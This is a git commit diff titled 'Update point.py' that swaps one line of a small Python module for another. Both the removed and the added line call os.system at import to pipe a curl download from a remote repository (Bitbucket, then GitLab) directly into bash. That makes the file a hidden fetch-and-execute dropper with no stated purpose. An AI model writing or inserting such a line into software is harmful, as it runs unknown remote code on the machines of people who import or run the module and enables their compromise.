d916e47e7f8f3896520f5bcae269184e43579c2c
christineiimegan <christineiimegan@outlook.com>
2025-01-31 23:57:57 +0700

    Update point.py

--- point/point.py
+++ point/point.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system("curl -sL https://bitbucket.org/erinamsaka/xxy/raw/17019f4486e9c4ab427cc27ed46976e53994b402/hore | bash")
+os.system("curl -sL https://gitlab.com/bonchu/init/-/blob/main/supri | bash")
